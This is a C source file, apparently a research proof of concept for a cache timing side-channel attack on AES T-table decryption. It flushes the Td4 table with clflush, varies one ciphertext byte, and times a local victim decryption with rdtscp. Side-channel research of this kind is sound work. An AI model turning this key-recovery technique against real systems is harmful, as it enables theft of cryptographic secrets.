/*
 * Copyright 2024 Zhiyuan Zhang
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "../../aes_source/attack.h"
#include <time.h>

#include <mastik/low.h>
#include <mastik/util.h>


extern u8 Td4[256];
#define REPEAT 1
#define memory_barrier asm volatile ("sfence;\nmfence;\nlfence;\n");

int flush_array[256 * 1024] = {0};

void init_array(int *buffer);
void victim_function(aes_t pt, aes_t ct, AES_KEY aeskey, int index);

int main(int argc, char* argv[])
{
  srand(1);

  int random_order = atoi(argv[1]);
  int check_byte = atoi(argv[2]);
  int change_value = atoi (argv[3]);
  char* random_ct = argv[4];

  aes_t key, pt, ct, pt_candidate, key_backup, real_key;
  toBinary(random_ct, key);
  AES_set_decrypt_key(key, 128, &aeskey);
  const u32 *rk;
  rk = aeskey.rd_key;

  for (int copy_key = 0; copy_key < 16; copy_key++) {
    real_key[copy_key] = (rk[copy_key/4] >> ((copy_key % 4) * 8)) & 0xff;
  }

  // Get first round key
  aes_t key_r0;
  for (int i = 0; i < 16; i++) 
    key_r0[i] = (rk[i/4] >> ((i % 4) * 8)) & 0xff;
  
  // Initialize the array, so that we can flush it later
  init_array(flush_array);

  // Get a ciphertext
  for (int i = 0; i < random_order; i++) {
    randPt(pt_candidate, key_r0, 1);
  }

  // We manually set the 6 LSBs of byte 0
  if (change_value != 99) {
    pt_candidate[0] = (pt_candidate[0] & ~0x3F) | change_value;
  }


  // Change 64 bytes and time the execution time
  //warmup
  for (int rr = 0; rr < 100; rr++)
    delayloop(0x800000);
  memory_barrier

  // We now just measure one byte
  for (int bytes = check_byte; bytes < (check_byte + 1); bytes++) {
    aes_t pt_collection2[64] = {0};
    uint32_t time_collection2[64] = {0};

    // Get modified ciphertext
    for (int i = 0; i < 64; i++) {
      toBinary(toString(pt_candidate), pt);

      for (int j = 0; j < 16; j++)
        pt_collection2[i][j] = pt[j];
      pt_collection2[i][bytes] = (pt[bytes] & (~0x3F)) | i;
    }

    for (int i = 0; i < 64; i++) {
      uint64_t overall = 0;
      for (int repeat = 0; repeat < REPEAT; repeat ++) {
        int index = random() & 0xFF;


        *(volatile uint8_t*)&Td4[64];
        *(volatile uint8_t*)&Td4[128];
        *(volatile uint8_t*)&Td4[192];
        memory_barrier
        memory_barrier
        memory_barrier
        memory_barrier

        clflush(&Td4[0]);
        memory_barrier
        memory_barrier
        memory_barrier
        memory_barrier

        clflush(&flush_array[flush_array[index << 10] << 10]);
        clflush(&flush_array[index << 10]);
        memory_barrier

        uint32_t timing = rdtscp();
        victim_function(pt_collection2[i], ct, aeskey, index); // Do AES decryption
        timing = rdtscp() - timing;
        memory_barrier
        overall += timing;
      }
      time_collection2[i] = overall / REPEAT;
      
    }

    FILE *f = fopen("data1.csv", "w");
    fprintf(f, "ciphertext time\n");
    for (int i = 0; i < 64; i++)
      fprintf(f, "%s %d\n", toString(pt_collection2[i]), time_collection2[i]);
    fclose(f);
  }
}


void init_array(int *buffer)
{
    for (size_t k = 0; k < 256; ++k)
    {                                                                  
        size_t x = ((k * 167) + 13) & (0xff);
        buffer[k * 1024] = x;
    }
}

void victim_function(aes_t pt, aes_t ct, AES_KEY aeskey, int index)
{
  memory_barrier
  volatile int next_index = flush_array[index << 10];
  asm volatile (".rept 100;\nNOP;\n.endr");
  next_index = flush_array[next_index << 10];
  asm volatile (".rept 100;\nNOP;\n.endr");
  AES_decrypt(pt, ct, &aeskey);
  memory_barrier
}
